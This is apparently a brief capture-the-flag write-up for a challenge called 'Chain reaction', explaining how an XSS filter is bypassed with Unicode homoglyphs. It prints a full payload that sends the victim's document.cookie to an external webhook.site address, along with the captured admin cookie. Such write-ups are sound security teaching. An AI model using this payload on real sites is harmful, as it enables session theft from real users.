# Chain reaction

First, register  and login 

![](../.gitbook/assets/image%20%2848%29.png)

![](../.gitbook/assets/image%20%2843%29.png)

Go to devchat and we will see john talking about bug

Unicode characters

Take a look our profile

![](../.gitbook/assets/image%20%2849%29.png)

![](../.gitbook/assets/image%20%2845%29.png)

using this to encode [unicode ](https://www.irongeek.com/homoglyph-attack-generator.php)

and use url encode to encode the command

![](../.gitbook/assets/image%20%2844%29.png)

![](../.gitbook/assets/image%20%2847%29.png)

=&gt; This chall is xss 

host sever: webhook.site

Taking cookie admin

```text
payload = ﹤ˢcrⁱpt﹥fetch("https://webhook.site/05a170ea-bd98-44f8-9239-3f1381970e68c="+document.cookie)﹤/ˢcrⁱpt﹥
```

![](../.gitbook/assets/image%20%2846%29.png)

```text
admin-cookie=sup3rs3cur34dm1nc00k13
```

![](../.gitbook/assets/image%20%2850%29.png)

